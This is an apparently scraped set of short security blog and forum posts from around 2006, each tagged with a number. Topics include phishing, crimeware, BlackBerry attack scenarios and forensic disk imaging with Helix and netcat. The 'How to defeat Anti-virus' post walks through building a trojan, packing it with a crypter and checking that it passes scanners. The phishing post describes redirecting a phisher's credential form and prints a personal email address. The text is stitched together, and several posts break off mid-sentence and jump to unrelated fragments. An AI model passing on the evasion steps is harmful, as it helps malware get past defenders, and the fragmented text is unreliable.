can get some of the popular ones from rootkit.com and play with them.     ok so say you have discovered one on your network, what do you do?  i am of the strongest belief there is only one real answer. you must do a complete reinstall of your os.  its really the only way to be sure. even if you think you have removed a rootkit, the attacker could have hid a file that has the rootkit reinstall itself when a normal program is opened. so always have a trusted back up ready to go if you are unlucky enough to encounter your worst nightmare
2;Crimeware Evolves with Polymorphing Botnet Wormsood stuff from infoworld magazines ephraim schwartz: if you are a cracker who has written an exploit, you have a choice between fame and fortune. in the good old days, crackers chose fame. but now fortune appears to be far more appealing.  crimeware is a multibillion economy, according to chad harrington, vice president of marketing[cq] at fireeye[cq], makers of a  crime stopping -- or should i say cracker-stopping -- appliance that uses virtual technology to stop an exploit before it gets into your network.  lest you think crimeware is the domain of some 16-year-old kid with too much time on his hands heres the multilayered reality.  at the bottom level, there are the crackers. these guys sell the vulnerability information to the next level up, called bot herders. a bot in crimeware terminology is a compromised machine.  the bot herders assemble this botnet of compromised machines and sell it to what are called the fraudsters. the fraudsters use the exploited machines to steal identities, customer and employee data, intellectual property, and the like. on the open market, an exploit can be sold for as little as $200 and as much as $50,000, harrington says.  although there are layers of security to contend with beyond compromising the op-erating system, once in the door, the rest is relatively easy pickings.  "getting back out again is the tricky part," harrington says.  bot herders typically charge $1 per compromised machine, per month. but if theyve cracked into a major corporation with access to customer and employee data, they could charge as much as $100 per system, per month.  whatâs scary is that these botted systems are computers inside the firewall. harrignton tells the story of a botted system that sent out notification of upcoming layoffs and directed employees to a bogus hr site that was hosted on the local domain and managed by a bot herder.  one of the major trends in crimeware for 2007 will be polymorphing botnet worms. these worms morph -- change their signature -- every four to six hours.  fireeye is using virtualization to combat these worms. rather than trying to guess whether a packet will harm the network, fireeye runs virtual machines and fools the system into sending the worm to one of these vms rather than the actual net-work.  i asked whether this process slows down the network. according to harrington, la-tency is measured in a couple of seconds if it is something the system hasnt seen, and microseconds if it has.  fireeye runs most oses plus a full stack of applications and browsers with users adding what they like.  it sounds as if anyone can set up their own vm solution to do what fireeye does. harrington admits it is a simple idea but says you have to intercept the traffic in real time, which takes a few patents.  if you set up a honey pot -- a machine intended to be compromised -- the attacker has to find that machine and compromise it. what fireeye does is "sniff the traffic" off the network and pretend it is the end point.  "there is a conversation on the network going on between machine a and machine b. we create a shadow version from machine a prime to machine b prime. as the protocol goes back and forth, we pretend we are the end point of this conversa-tion," harrington says.  unfortunately, crimeware is a not a virtual reality. its the real thing. will 2007 be the year we finally gain the upper hand? only time will tell.  for original story: http://www.infoworld.com/article/07/01/ ... ity_1.html do
0;When I was phished?i all, i would like to share with you a phishing experience i had to face recently. for those who need an introduction on phishing: phishing and identity theft in computing, phishing is a form of criminal activity using social engineering techniques. phishers attempt to fraudulently acquire sensitive information, such as passwords and credit card details, by masquerading as a trustworthy person or business in an electronic communication. phishing is typically carried out using email or an instant message, although phone contact has been used as well. phishing techniques most methods of phishing use some form of technical deception designed to make a link in an email appear to belong to the spoofed organization. misspelled urls or the use of subdomains are common tricks used by phishers. recently i received an instant message (yahoo) from one of my friend who is not very good with the technical aspects of internet. he is just a common internet user. the message recieved : http://www.geocities.com/chakkkara_ummma/yahoo.html click this link and login ur yahoo id, u will get a wonderful gift enjoy. pls send this message to all ur buddies as a normal enthusiastic user, we all have the tendency to open the link. when a user clicks on the above link, it opens a page as displayed below: if you look closely at the displayed page, it looks very similar to yahoo login page. however, it is not a yahoo page. the cracker (lets not call him a hacker, as hacking is never un-ethical) has smartly created a web page which looks very similar to the login page of yahoo. when an novice user fills in the page with his username and password, and click the sign in button, on the back ground, the entered user credentials (username and password) is sent to some database / email id. my friend entered his username and password unknowingly and .....so i decided to find the culprit. lets find the culprit   using tamper data (an add-on for mozilla firefox), i captured the informations sent through this web page. see the below screen shot:  if you look at the above image very closely, you can easily understand the following facts (refer the red lines): * when the user clicks the sign in button, the page is re-directed to  http://www2.fiberbit.net/form/mailto.cgi * the page (or the script) is programmed in such a way that a mail will be sent to  love.cynade@gmail.com . (refer the field "mail_to") * the mail will appear to come as if from sparkz (refer the field "mail_from") * once the mail is send, the page will be automatically redirected to  http://photos.yahoo.com . (refer the field "next_page") so we have found the cracker here. the persons email id is  love.cynade@gmail.com . a step further. using the same tool mentioned above, the data send from a web page can be altered. so what i have done is, i changed the "mail_to" value from  love.cynade@gmail.com  (internally the email id  love.cynade@gmail.com  is represented as love.cynade%40gmail.com) to  xxxx.zzzzzzzz@gmail.com  (my email id). and hurray, i got the details delivered in my mail box. see the below screen shot: it displayed the full information about the user who visited the site which includes: * the isp of the user - in my case it is asianet.co.in. * the ip address of the user - in my case it is 202.**.227.*** (not displayed due to various security reasons) * these information can be further used to get into your personal system.  tracing down the cracker to trace the location of the hacker who was using the email id  love.cynade@gmail.com , i created a temperory email id, registered a temperory account with readnotify.com and shooted some mails to  love.cynade@gmail.com . and hooray, when he opened the mails i got the ip address of him and thats it.  i wrote to yahoo also regarding the same and they immediately removed the site from geocities and replied back. and withing weeks yahoo changed their login screen also. the cracker was able to get into many compromised accounts and from there to many accounts like banks, e-commerce sites etc using this simple techniques.  the above quoted url is currently not available as it is removed by yahoo. but there are still thousands of phishing sites available that may exploit the human factor of the internet technology. do you have any similar experiences - share it here - what ways the hacker approached you? ...... regards, the morpheu
2;Study Shows Internet to Be Resilient Against Terror Attackolumbus, ohio, sept. 28 (ascribe newswire) -- researchers have simulated what would happen to internet reliability in the united states if terrorists were able to knock out various physical components of the network.         the good news is that it would be very difficult to cause major disruptions across the country, although destruction of some key parts could seriously degrade internet quality.         "when it comes to the internet, there is strength in numbers," said morton okelly, co-author of the study and professor of geography at ohio state university.         "there are so many interconnections within the network that it would be difficult to find enough targets, and the right targets, to do serious damage to internet reliability nationwide."         okelly conducted the study with hyun kim, a graduate student at ohio state, and changjoo kim, assistant professor of geography at minnesota state university. their results were published in a recent issue of the journal environment and planning b.         this study continues research okelly and several colleagues conducted in 2003. in that study, the researchers tested internet reliability using the assumption that selected city network nodes were rendered completely inoperable, because of accidents or attacks. (network nodes are places that house the equipment where internet traffic is collected and distributed.)         but that assumption is not very realistic, okelly said. network nodes have a subnetwork of interconnections between various commercial internet backbone providers. these backbone providers have what are known as peering agreements to share internet traffic, and these can become critical if one of them is having troubles. the result is that it is unlikely that an entire network node could be disabled.         in this new study, the researchers developed computer simulations in which they studied a simplified nationwide internet network.         in order to make the study more manageable, the researchers used just five of the more than 30 major commercial internet backbone providers, and three of the nations major public access points - places that connect traffic from many internet service providers. the three access points studied were in chicago, dallas and san francisco.         they then simulated disruption or failures of parts of the network to see what would happen to internet connectivity between various pairs of cities - 946 pairs in all. however, in contrast to earlier studies, they assumed that not all the backbone providers in a network node would be disabled at once, and that peering agreements would allow at least some internet traffic to continue flowing.         as would be expected, results differed greatly depending on the number and specific parts of nodes that were disrupted in the simulations, okelly said.         for some city pairs, disruptions in nearly a dozen specific nodes would not make much difference in internet reliability, but a disruption in a single critical node would cause major problems. and such critical nodes may be different for any particular pair of cities.         one interesting city pair in the study was seattle and boston. geographically, they were farthest apart of any pair. but in terms of reliability, they were ranked very highly - 147th of the 946 city pairs.         that was largely because there were many separate paths for internet traffic to travel between the two cities, okelly said. moreover, traffic could be routed through any of three of the major hub cities, all of which were highly reliable because of the peering agreements between the internet backbone providers.         "seattle and boston show the advantages of multiple pathways and resilient hubs," he said.         overall, the results showed the internet has a great resilience against accidental disruption or even targeted attacks by terrorists, okelly said.         "there is a rich web of connections in these internet nodes, and a hit on a single city node or even several of them is not likely to wipe out internet connectivity," okelly said. "thats not to say major damage cannot be done, but it would be very difficult."         okelly noted that this study used a simplified model of the internet, which means the strength of the entire network is probably even greater than what they found.         "if our simple model was resilient to damage, the real internet would be much better off because it has so many more hubs and links than we had in our study," he said.         an sbc faculty fellowship to okelly helped support the research.         - - - -         contact: jeff grabmeier, ohio state research communications, 614-292-8457,  grabmeier.1@osu.edu   original story: http://www.ascribe.org/cgi-bin/behold.p ... 6&public=1 do
2;Apple Shipped iPods Carrying Windows Virusonest mistake or more marketing mayhem from jobs? apple computer has reported that a small number of its popular video ipods were infected with a virus that targets windows pcs before they were sold to consumers.  according to a statement issued by the hardware maker on oct. 17, roughly 1 percent of the ipod video devices it has shipped since sept. 12 were loaded with the ravmone.exe windows trojan during manufacturing.  the cupertino, calif.-based company said that it has received only 25 individual reports of incidents where the virus has been discovered by users who bought the handheld gadgets since that date, and reported that all of its products, including newly shipped models of the affected device, have been cleansed of the malware program.  the ravmone.exe code is an attack that only affects windows computers and propagates itself via storage devices. once infected, computers carrying the program can be forced to open links to malicious web sites that may drop additional malware onto the machines. as a result, apple encouraged users who may have infected ipods to scan any mass storage devices that they have attached to their windows computers, such as external hard drives, digital cameras with removable media, and usb flash drives.  apple, who blamed a contract manufacturer for allowing the infected ipods to be shipped, said that since ravmone.exe is a known attack, it is already covered by most popular windows anti-virus applications. the company indicated that concerned users could also protect themselves further by updating to the latest version of its itunes software. in apologizing for the situation, apple officials couldnt resist the opportunity to take a shot at microsofts windows operating system, which holds a vast lead in worldwide market share compared with apples mac os x. apple has long touted the security of its software as a major benefit in comparison to windows.  "as you might imagine, we are upset at windows for not being more hardy against such viruses, and even more upset with ourselves for not catching it," the company said in its statement.  the ipod-borne windows virus could serve as another reason for enterprise it administrators to ban users from bringing the multimedia players into the office. the entertainment devices have already been forbidden at many data-sensitive companies based on their perceived threat as a means for unauthorized downloading of valuable corporate information. security experts refer to the use of the apple machines in such a manner as "ipod slurping." for full story: http://www.eweek.com/article2/0,1895,2033186,00.asp do
2;Microsoft Caves on PatchGuard, Appeases Symantececurity is security, but business is business i guess.  it wasnt worth it to microsoft to stick to its positions on patchguard and the windows security center. the details arent in yet, but based on microsofts vague initial statements it appears that the company has essentially acceded to symantecs position on patchguard and is trying to finesse matters on the security center. the security companies that raised the initial stink are understandably waiting for details, but it probably makes sense for microsoft to try to make most of them happy enough to shut up and let it ship vista without raising a further stink. symantecs position on patchguard has been to create a set of apis through which certified vendors could install code that bypassed patchguard through defined mechanisms. mechanisms.  in a recent blog symantec put it this way:  - symantec has provided microsoft with recommend apis that will allow legitimate, authorized and certified security vendors to leverage the same capabilities that we have in prior versions of windows.  - symantec has been asking for these capabilities for well over one year now and therefore these concerns are not a new development to microsoft.  - symantec has repeatedly suggested that microsoft establish a new certification model that will certify legitimate vendors who seek to extend the windows vista kernel. this certification, on top of existing driver certification steps, will ensure that certified vendors are not attempting to bypass windows drm and that certified vendors are not malicious and are making genuine enhancements to windows vista. microsoft security personnel have told me about this proposal in the past and said it makes them nervous, and i can see why. consider it an increase in the attack surface of 64-bit windows relative to the current design of patchguard. but still, it does fit with microsofts style of doing things, and if the certification program is run fairly and carefully its not likely introduce malware directly.  im more worried about vulnerabilities in the security programs themselves opening up the windows kernel to attack, but this is probably not a major problem for two reasons: 1) the set of windows vista systems is a large target, the set of vista systems running any particular vulnerable version of a security product much less so; and 2) as symantec notes, its possible for third parties, after signing their code properly, to install boot-time kernel drivers. this code could also expose the kernel, but banning third-party code is hardly the answer. for full story: http://www.eweek.com/article2/0,1895,2031755,00.asp do

3;Nice Article on Corporate Forensicsood article in sc magazine by jim carr on how to handle a data-stealing breach. enterprises need to have forensics systems and personnel inplace, whether that be inside your organization or fropm an outsourcer. either way, this article helps inform you on how to make some of those decisions. how do you stop a criminal mind from getting into your key line-of-business systems? you probably cant, which is why mike jones (not his real name) keeps a computer forensics services company at his beck and call. the attempts to steal the personal identifying information on credit cards never ceases. jones, an investigative manager for a large u.s. financial services company (who asked to remain anonymous because of the sensitive nature of his business), relies on cybertrust, herndon, va., to help him identify, forensically examine, and remediate database compromises intended to steal the information on credit cards magnetic strips processed by his companys systems. the data-stealing breaches dont occur on his firms systems. they actually take place on those of the retailers, restaurants and other merchants that accept credit cards as payment for goods or services.  jones certainly isnt alone in this regard, says michael gavin, a senior analyst with forrester research. "it takes a bit of an expert to run forensics tools and know what youre doing when investigating computer-related crimes," he says. some of the enterprise-class computer forensics tools available include cas etrust network forensics, guidance softwares encase enterprise forensic edition, accessdatas ftk, netwitnesss netwitness, and the open source helix. they are all extremely complicated applications that require considerable training and expertise to use properly, according to matthew shannon, a principal with agile risk management, a forensics and litigation support services provider based in tampa, fla. looking to outsource but it often doesnt make sense to hire and keep forensics experts on staff full-time, notes shannon. consequently, most companies find a consulting firm they can partner with for their forensics investigations, gavin says. pricewaterhousecoopers and ernest & young, are among those gavin points to. others include agile, kroll ontrack, mandiant, and neohapsis. keeping it inside still, many enterprises do keep computer forensics in-house. just how many is open to discussion, says forresters gavin. deploying and maintaining an enterprise-class forensics application in-house is something that requires training and a certain amount of experience, brill says. "and, after a certain amount of time, you have to update the software, and you have to understand how the update affects how you use the software." for full story: http://www.scmagazine.com/us/news/artic ... gging-dirt do
2;U.S. Passport RFID Already Hackedell that didnt take long. its been roughly a whole month since the u.s. has been issuing passports with rfid chips in them, and already theyve been hacked. in theory, at least. the hack was released late last week and is now making the rounds. for a first stab at a hack, it is still on the limited side and is nothing to panic too heavily over. the hacker needs certain "seed" information in order to read all the data on the passport, including: your passport number, your date of birth, and the date the passport expires. using that information, anyone can obtain some of the digitally encoded data on the passport, including the digital image of your face and some personal information (its not clear exactly what). at first glance this doesnt sound so bad: obtaining someones date of birth is easy, but their passport and expiration date much less so. still, all a hacker needs is a quick photo of that info or, more realistically, a simple method to intelligently brute-force-attack the passport in order to get the data. more importantly, though, this is just the first passport crack in what will undoubtedly be a long line of them, culminating with a one-click method to crack any passport there is. for now, theres just the one: rfidiot, and the code is online for all to see. hang in there, folks. happy halloween. original story: http://tech.yahoo.com/blogs/null/6808;_ ... 1xkp8rlpa5 do
3;HBO Documentary: Hacking Democracyebuting tonight on hbo, this cautionary documentary exposes the vulnerability of computers - which count approximately 80% of americas votes in county, state and federal elections - suggesting that if our votes arent safe, then our democracy isnt safe either. this presentation is set to play numerous times after its debut. electronic voting machines count about 87% of the votes cast in america today. but are they reliable? are they safe from tampering? from a current congressional hearing to persistent media reports that suggest misuse of data and even outright fraud, concerns over the integrity of electronic voting are growing by the day. and if the voting process is not secure, neither is americas democracy. the timely, cautionary documentary hacking democracy exposes gaping holes in the security of americas electronic voting system.  in the 2000 presidential election, an electronic voting machine recorded minus 16,022 votes for al gore in volusia county, fla. while fraud was never proven, the faulty tally alerted computer scientists, politicians and everyday citizens to the very real possibility of computer hacking during elections.  in 2002, seattle grandmother and writer bev harris asked officials in her county why they had acquired electronic touch screen systems for their elections. unsatisfied with their explanation, she set out to learn about electronic voting machines on her own. in the course of her research, which unearthed hundreds of reported incidents of mishandled voting information, harris stumbled across an "online library" of the diebold corporation, discovering a treasure trove of information about the inner-workings of the companys voting system.  harris brought this proprietary "secret" information to computer security expert dr. avi rubin of johns hopkins university, who determined that the software lacked the necessary security features to prevent tampering. her subsequent investigation took her from the trash cans of texas to the secretary of state of california and finally to florida, where a "mini-election" to test the vulnerability of the memory cards used in electronic voting produced alarming results.  as the scope of her mission grew, harris drew on the expertise of other computer- science experts, politicians and activists, among them: andy stephenson, candidate for secretary of state in washington state; susan bernecker, republican candidate in new orleans; kathleen wynne, an activist from cleveland; dr. herbert thompson, chief security strategist, security innovation, inc.; ion sancho, supervisor of elections for leon county, fla.; and harri hursti, a computer-security analyst. academics, public officials and others seen in interview footage include: deanie lowe, supervisor of elections, volusia county, fla.; mark radke, marketing director of diebold; david cobb, presidential candidate, green party; and rep. stephanie tubbs-jones of ohio.  diebold software, or other software like it, is installed in thousands of counties across 32 states. david dill, professor of computer science at stanford, says the problem is that there are "lots of people involved in writing the software, and lots of people who could have touched the software before it went into that machine. if one of those people put something malicious in the software and its distributed to all the machines, then that one person could be responsible for changing tens of thousands of votes, maybe even hundreds of thousands, across the country."  in florida, leon county supervisor of elections ion sancho presided over a trial "mini-election" to see if the vote could be hacked without being detected. before votes were actually cast, computer analyst harri hursti "stuffed the ballot box" by entering votes on the computers memory card. then, after votes were cast, the results displayed when the same memory card was entered in the central tabulating program indicated that fraud was indeed possible. in other words, by accessing a memory card before an election, someone could change the results - a claim diebold had denied was possible.  ultimately, bev harris research proved that the top-secret computerized systems counting the votes in americas public elections are not only fallible, but also vulnerable to undetectable hacking, from local school board contests to the presidential race. with the electronic voting machines of three companies - diebold, es&s and sequoia - collectively responsible for around 80 percent of americas votes today, the stakes for democracy are high.  one of the executive producers of hacking democracy is sarah teale, whose previous hbo credits include "dealing dogs" and "bellevue: inside out."  hacking democracy was directed by simon ardizzone and russell michaels; produced by simon ardizzone, robert carrillo cohen and russell michaels; executive producers, earl katz, sarah teale and sian edwards; edited by sasha zik. for hbo: supervising producer, john hoffman; executive producer, sheila nevins. http://www.hbo.com/docs/programs/hackin ... main_title do

0;How to defeat Anti-virusll hackers worth anything know how easy it is to defeat anti-virus. what worries me is the amount of security professionals i encounter that are not aware and put too much trust in it as a major part of their line of defense.  now don’t get me wrong, i do believe you should be running it, but i feel its foolish to think just because a file passed a simple av scan, all is ok.      to understand how to defeat anti-virus programs, you first need to understand how they work.  av scanners work by recognizing malware through a digital signature of their code.  its much more efficient to simply check each file on the hard drive against a piece of binary code “signature” in the av’s data base. if there is a match, then the av scanner will see it as malware. if not, it lets the file go on its merry way.     in order to broaden the scope of the scan, many scanners also do what they term as "heuristic" scanning.  unfortunately, all this means is the av will also make alerts on what they see as a near or possible match to the signature.  this can be more of nuisance than a help sometimes when the av miss identifies a security program as a trojan.    so all we need to do to defeat anti-virus is to create malware that is free of any bytes of code that can be matched to any known virus,etc…   there are two very popular methods for this in the hacker community: 1.	write your own malware. 2.      use a "packer / crypter"  writing your own malware is the best choice but many hackers are weak in coding so they often rely on using a crypter instead.  crypters are programs that take all the code from the program and apply an encryption algorithm to it.  this will confuse the av scan because it will not be able to match the code against its database of signatures. the interesting thing about a file encrypted in this manner is that it will still function fully because the new encrypted file will include what is called a “stub”. the “stub” is a piece of code that can decrypt and cause the original file to run dynamically.  there are a few packer / crypter programs available on the internet that can be downloaded.   however, i have found that many avs have checked these out and now include a decryption algorithm in their scanners that can see through the encryption if you use one of the better known crypters.    the problem is, most hacker groups have at least one person that can do some basic coding and it’s very easy to code a crypter. it’s actually easier to code a crypter than write a trojan from scratch.  if you code your own private crypter, no anti-virus will catch your malware!     anti-virus companies have been very slow in responding to this.  it is well know that it took over a year for them to respond to morphine. morphine was a crypter released on  www.hxdef.org&nbsp;  and made just about any trojan slip right through av scanners.   what about now? well as a simple test i decided to download some very readily available programs on the internet.  one program was a “make your own trojan” program, presumably for someone that wanted to make a trojan but had no coding skills. the second program was a program that is supposed to make your trojan “stealth”.  while this program had some out dated things like a “byte packer”, it did have a packer/ cyrpter.       ok, so i created the trojan and named it trojan.exe.  heck,  no one will expect anything that obvious, ha ha ? i then bound it to a small legitimate exe.  i had it set so once you downloaded it and click on it, all you would see is a message stating that “you have been hacked!”.  ok, not very original but i was rushing through this to get to the end result.     first test was to try and upload it to my yahoo mail. i received the following message: the following file has not been attached:   trojan.exe (284k) file infected. this file can not be cleaned. please run a virus scan on your computer.   ok thats great. yahoo’s anti-virus saved the day. now lets take that same trojan and pack and scramble it. this time when we try to email it we get the following message:   the following file has been attached:   trojan.exe (284k) [remove] no virus threat detected attach more files   i go ahead and email it to myself and download it to one of my boxes and guess what? it runs just fine!  how can this be? these 2 programs are readily available on the net if you know where to find them.   lets check the scrambled trojan with  http://www.virustotal.com/en/indexf.html . this is a great free site that will run multiple av scan engines against malware. we get this out put: complete scanning result of "trojan.exe", received in virustotal at 11.10.2006, 19:20:46 (cet).  antivirus    version      update             result antivir

encrypting it in this method in no way inhibits that trojan from working.  again, i want to stress that i am not saying that av scanners are useless and to not bother with them. i am just trying to point out that they are not the total solution to your network security.     if you have to download something that you are not sure of, the best practice is to first download to a computer on your

birthday card from a friend, well you might want to be a little concerned!!!
3;Pen Test Consulting Series Part 1 of 6his is the first in a six-part series for consultants and value-added resellers (vars) about penetration testing. over the course of the six articles ill look at several elements of penetration testing, including the test phases, tools and techniques, types of wireless testing and what bugs to look for. in this first article, i give an overview of penetration testing, discuss some legal and ethical implications, and give some pointers on what potential customers look for in a penetration tester. penetration testing is a security testing methodology that should be one element of a total security testing strategy that you offer customers. whether large or small, every business needs to know what their "security posture" is, how secure their network is, and how this posture relates to other companies in the same market space.  a complete security snapshot includes:  - level i, high-level assessment: a top-down look at the organizations policies, procedures, standards and guidelines. a level i assessment is not usually hands-on, in that the systems security is not actually tested.  - level ii, network evaluation: more hands-on than a level i assessment, a level ii assessment has some of the level 1 activities with more information gathering and scanning.  - level iii, penetration test: a penetration test is not concerned with policies. its more about taking the adversarial view of a hacker, by seeing what can be accomplished and with what difficulty. the reason to penetration test is the same as the reason a business has a security policy: to leverage due diligence and due care data protection for the preservation of the companys capital investment.  several factors have converged in the marketplace to make penetration testing a necessity. the evolution of information technology has focused on ease of use at the operational end, while exponentially increasing the complexity of the computer. unfortunately, the administration and management requirements of these systems have increased because: - the skill level required to execute a hacker exploit has steadily decreased.  - the size and complexity of the network environment has mushroomed.  - the number of network and web-based applications has increased.  - the detrimental impact of a security breach on corporate assets and goodwill is greater than ever. all of these factors are good selling points when presenting a pen testing project to your customer.  penetration testing is most commonly carried out within a "black-box" approach; that is, with no prior knowledge of the infrastructure to be tested. at it simplest level, the penetration test process involves three phases:  - preparation phase - a formal contract is executed containing non-disclosure of the clients data and legal protection for the tester. at a minimum, it also lists the ip addresses to be tested and time to test.  - execution phase - in this phase the penetration test is executed, with the tester looking for potential vulnerabilities.  - delivery phase - the results of the evaluation are communicated to the pre-defined organizational contact, and corrective action is advised. legal and ethical implications of penetration testing attacking a network from the outside carries ethical and legal risk to you, the tester, and remedies and protections must be spelled out in detail before the test is carried out. for example, the cyber security enhancement act 2002 implicates life sentences for hackers who recklessly endanger the lives of others, and several u.s. statutes address cyber crime.  statute 1030, fraud and related activity in connection with computers, specifically states that whoever intentionally accesses a protected computer without authorization, and as a result of such conduct, recklessly causes damage or impairs medical treatment, can receive a fine or imprisonment of five to 20 years. therefore, its vital that you receive specific written permission to conduct the test from the most senior executive.  while written permission to conduct a pen test helps protect you from risks, your customer also requires protection measures. you must be able to guarantee discretion and non-disclosure of sensitive company information by demonstrating a commitment to the preservation of the companys confidentiality. the designation of red and green data classifications must be discussed before the engagement, to help prevent sensitive data from being re-distributed, deleted, copied, modified or destroyed.  the credibility of your firm as to its ability to conduct the testing without interruption of the customers business or production is also of paramount concern. you must employ knowledgeable engineers who know how to use minimal bandwidth tools to minimize the tests impact on network traffic.  the ethicality of your company and testers is very important, also. many customers insist that the testing firm not engage any "black-hat" testers (that is, testers who have criminal convictions) and that the testing firm conducts background checks on anyone who will participate in the engagement.  in the next installment, ill look at the pre-test phases of penetration testing, including footprinting. about the author russell dean vines is a bestselling author, chief security advisor for gotham technology group, llc, and president of the rdv group. his most recent book is the cissp and cap prep guide, published by john s. wiley and sons. as an expert for searchsecuritychannel.com, russell welcomes your questions on pen testing and information security threats. original article: http://searchsecuritychannel.techtarget ... 81,00.html do

3;Cracking the BlackBerry with a $100 Keyhe security model of that blackberry on your hip isnt holding up very well to third-party scrutiny. according to a white paper by john oconnor, a researcher on symantecs security response team, hackers can pay $100 for an api developer key that can open doors to the theft of data from research in motions blackberry devices. oconnors paper was briefly posted -- and quickly yanked -- from a blog entry discussing the future of the blackberry device. it is not yet clear why symantec pulled the paper (the rumor mill says its being saved for a conference presentation) but a quick peek at the findings suggests there might have been some external pressure involved. some highlights from oconnors paper, which was seen by eweek security watch: *** the blackberrys "modest" security framework it is still susceptible to multiple attacks, including being used as a backdoor, allowing confidential data to be exported. *** the blackberry can be used as a proxy for attackers. some of these attacks require applications to be digitally signed, while others can be conducted without such a signature. *** while code-signing provides a potential hurdle for malicious code writers, signatures can still be obtained with relative ease and anonymity. code-signing keys can be bought for $100 -- completely anonymously via the use of prepaid credit-cards. this completely undermines the ability to determine the creators of a signed application, and perhaps track them down in the case of malicious code being signed.  *** sending and receiving sms (text messages) is very simple on the blackberry, and doesnt require the code to be signed. users will receive a prompt the first time the program attempts to send a message, asking if they wish to allow network access, but there are no further warnings on subsequent runs of the application. the same warning is used for an application making a http connection or trying to send an sms, meaning that a user could be easily fooled into sending very expensive premium sms messages by an application that purports to connect to the internet for legitimate purposes. *** premium rate "dialer" scams can be extended from the pc to blackberry devices, running up huge bills in the process. the application would work as follows: user downloads and runs an application (e.g. a game with "post my high-score online" option). if the code is unsigned, the user receives a prompt "allow network access?" user agrees (thinking he or she is posting high scores on a web site) the application proceeds to send a premium-rate sms message in the background unbeknownst to the users until they receive their phone bills. *** blackberry devices are susceptible to sms interception attacks that allow hackers to send sms via the infected device and receive the access code giving them free wi-fi access, while the victim is billed instead. other sms billable services include voting polls, parking and even using vending machines. note that if the application is signed, the user will not even be prompted. *** signed applications can send e-mail and read incoming e-mail. a malicious application could be used to allow third parties to send messages from the infected blackberry and also read all received messages. a malicious application could also use e-mail as a command and control channel to receive instructions to send and receive e-mails; send and receive sms messages; add, delete and modify contacts and pim data; read dialed phone numbers; initiate phone calls; and open tcp/ip connections. *** a malicious signed application can launch an e-mail worm by sending a message containing a link to a jad (java application descriptor) file. when the user opens this link, he or she will be prompted to install the worm code from a remote web site maintained by the attacker. *** an attacker could use a malicious signed application to read all the pim data (contacts, events, to-do lists). this data can be transmitted to the attacker via e-mail, tcp sockets, sms or telephony. *** data integrity stored in the pim can be compromised by a signed application. attack scenarios include changing the number associated with a contact name; changing the name associated with a phone number; deleting a contact, event or to-do task; changing the timing of a scheduled event; or reading all the contact names and numbers, and randomly swapping them. oconnors paper also outlines ways in which blackberry phones can be manipulated to launch tcp backdoors, tcp scans, http backdoors and infostealers, and spyware-type call monitoring. he warns that the available api (without code signing) provides "limited opportunities" to exploit the blackberry platform. this will require social engineering, where the target is tricked into approving the attacks. however, because the key can be purchased by anyone for just $100, oconnor believes that a motivated attacker could develop a range of deceptive or malicious software that could not only compromise the blackberry handheld device and its data, but the integrity of the corporate network to which it is attached. "as the device continues to become more popular, the incentives for such [malicious] individuals to target the blackberry will only increase," said oconnor, who is based in symantecs dublin office. for original article: http://securitywatch.eweek.com/exploits ... 20106ep21a do
0;Gathering and mounting hard drive images with Helixve been planning to write up some instructions on how to safely aquire an image of a hard drive for a couple of weeks now, and the only reason i havent gotten around to it is because i wanted to make up one of those cool videos that other people have put up.  however, ive had some trouble getting my hands on both software and time, and i also decided that maybe it was best if these instructions were written out so it would be easier to reference them later.  so without further delay, here are my instructions on gathering a hard drive image with helix and mounting the image with ubuntu. for this lab i will be using two virtual machines, one with a 10gb hard drive and the other with a 3gb hard drive.  the small drive allows me to aquire the image more quickly, and the methods will remain the same.  both machines are running pristine fresh installs of ubuntu 6.10 (edgy eft) with the latest patches, but no additional software.  ill also be using a helix boot cd to aquire the hard drive image. first we need to set up our target machine to gather some evidence from the suspect machine.  open a command prompt and type      code: nc -l -p 2000 > fdisk-output  and hit enter.  this command instructs the target machine to listen for network connections on port 2000 and send the output of any connection into a file called fdisk-output. start the evidence aquisition by booting the suspect machine with the helix boot cd.  open a command prompt and type      code: fdisk -l   to get a list of partitions and devices that are available on the machine.  in the case of my virtual machine the hard drive itself is represented by  /dev/sda , and each partition on the drive is represented by another file, sda1, sda2, and sda5.  youre going to want to keep a copy of this output, so type the following command:      code: fdisk -l | nc 192.168.0.130 2000 -q 10  and hit enter.  this command will print the partition table for the suspect machine and send it over the network to your target machine, which will write it into a file called fdisk-output.  go back to your target machine and type      code: cat fdisk-output   and you should see the exact same output as the fdisk -l command on the suspect machine. next we need to capture a hash value of the hard drive.  on the target machine type      code: nc -l -p 2000 > hard-drive-hash   and hit enter.  then, on the suspect machine type      code: md5sum /dev/sda | nc 192.168.0.130 2000 -q 10 .  this command will take a while to complete so dont get impatient.  the larger your hard drive, the more time it will take.  be patient.  eventually it will be done and if you go to the target machine and type      code: cat hard-drive-hash   you should see a long string of numbers.  this is the hash value of the suspect hard drive.  if you make any changes to the suspect hard drive this number will change.  if you dont believe me, do this for some extra credit: on the suspect machine in the command prompt type mkdir /mnt/sda1.  then mount the first partition on the drive by typing mount /dev/sda1 /mnt/sda1.  then type unmount /dev/sda1.  all youve done is mounted the drive and unmounted it.  you havent even looked at any of the contents, but if you type md5sum /dev/sda youll see that the hash value of the hard drive has changed.  if you just went through these steps then you should probably repeat the steps at the begining of this paragraph so that the correct hash value is on the target machine. now were ready to aquire the hard drive image.  on the target machine you should enter the following command      code: nc -l -p 2000 | dd of=hard-drive-image.gz  so that the machine will be ready to accept the image.  on the suspect machine open the helix menu on the bottom, go to forensics and select air.  there are several tools for gathering hard drive images, but air is my favorite so far.  in the source device/file enter the device file for the suspect hard drive, in my case  /dev/sda .  next, click on the network button under connected devices.  a dialog box will come up and ask if the remote computer is the source or the destination.  in this example it is the destination.  then another box will ask for the ip address and port number of the remote computer.  you can see a screenshot of my example at  http://mavdisk.mnsu.edu/kevin/air-setup.jpg .  after saying yes to the promts, we should set up compression.  the process of transferring a hard drive over the network takes a long time as it is, and without compression it takes even longer.  from the compression drop down, select gzip.  in the hash box make sure it says md5.  finally you can click on the start button.  i would recommend that after you do that you also click on show status window so you can see how it is going.  over on the target machine you can open another command prompt and type      code: watch ls -lh hard-drive-image   to see an updated status of the file size.  when the process is finished, air will give you the md5 hash of the hard drive as it was copied, and this number should match the md5 sum that you gathered when you first hashed the drive. if you go back to the target machine youll have the contents of the suspect machines hard drive compressed in a file called hard-drive-image.gz.  if you md5sum this file it will not match the other hash because youre hashing the compressed hard drive.  first we need to uncompress the hard drive image with this command      code: gunzip hard-drive-image.gz .  this will leave you with a file called hard-drive-image, and if you run md5sum hard-drive-image then the resulting hash should match the original hash you took from the suspect machine.  if it does not then something went wrong in the evidence collection and you do not have a perfect copy of the suspect hard drive. now we want to mount one 